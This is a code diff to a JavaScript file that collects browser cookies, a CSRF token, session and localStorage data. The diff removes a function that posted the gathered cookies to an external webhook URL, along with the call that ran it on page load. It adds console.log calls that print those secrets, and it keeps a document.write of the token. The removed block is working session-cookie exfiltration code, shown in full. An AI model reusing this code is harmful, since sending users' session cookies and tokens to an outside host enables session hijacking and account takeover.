@@ -10,11 +10,13 @@ function getCookies() {
 
     return cookies;
 }
-
+console.log(getCookies());
+    
 function getToken() {
     const toke = document.csrfToken;
     document.write(toke);
 }
+console.log(getToken());
     
 function getSessionData() {
     // From Cookies
@@ -36,6 +38,8 @@ function getSessionData() {
         localStorage: sessionLocalStorage
     };
 }
+console.log(getSessionData());
+    
 function displaySessionCookieInDiv() {
     const cookiePairs = document.cookie.split('; ');
     const cookies = {};
@@ -52,30 +56,8 @@ function displaySessionCookieInDiv() {
     div.innerHTML = JSON.stringify(cookies, null, 4);
 
     // Send the cookies to the webhook
-    sendCookiesToWebhook(cookies);
 }
-
-function sendCookiesToWebhook(cookies) {
-    const webhookURL = 'https://hook.us1.make.com/ugf3nyygevcvtjubzfk3elr7q7k5a476'; // replace with your webhook URL
-
-    fetch(webhookURL, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(cookies)
-    })
-    .then(response => response.json())
-    .then(data => {
-        console.log('Cookies sent successfully:', data);
-    })
-    .catch(error => {
-        console.error('Error sending cookies:', error);
-    });
-}
-
-// Call the function to display and send the session cookie(s)
-displaySessionCookieInDiv();
+console.log(displaySessionCookieInDiv())
 
 console.log(getSessionData());
 
